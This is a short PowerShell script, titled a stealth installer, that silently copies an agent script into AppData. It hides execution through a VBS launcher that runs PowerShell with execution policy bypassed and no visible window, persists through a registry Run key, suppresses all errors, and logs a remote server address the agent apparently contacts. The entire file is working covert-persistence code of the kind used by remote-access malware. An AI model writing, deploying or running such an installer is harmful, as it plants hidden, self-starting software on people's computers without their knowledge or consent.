# UC Stealth Installer — Deploys agent silently
# No UAC prompt, installs to AppData, auto-starts via registry

$ErrorActionPreference = "SilentlyContinue"

$installDir = "$env:APPDATA\UCService"
$agentFile = "$installDir\uc-agent.ps1"
$logFile = "$installDir\install.log"

# Create directory
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

# Copy agent script
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Copy-Item "$scriptDir\uc-agent.ps1" $agentFile -Force

# Create VBS launcher (runs PowerShell hidden — no window flash)
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$agentFile""", 0, False
"@
$vbsFile = "$installDir\launcher.vbs"
Set-Content -Path $vbsFile -Value $vbsContent

# Auto-start via registry (no admin needed)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "UCService" -Value "wscript.exe `"$vbsFile`""

# Start now
Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`"" -WindowStyle Hidden

# Log
"Installed: $(Get-Date)" | Out-File $logFile
"Agent: $agentFile" | Add-Content $logFile
"Server: https://uc-universal-connect-omega.vercel.app" | Add-Content $logFile

Write-Host "UC Agent installed and running."
Write-Host "Location: $installDir"
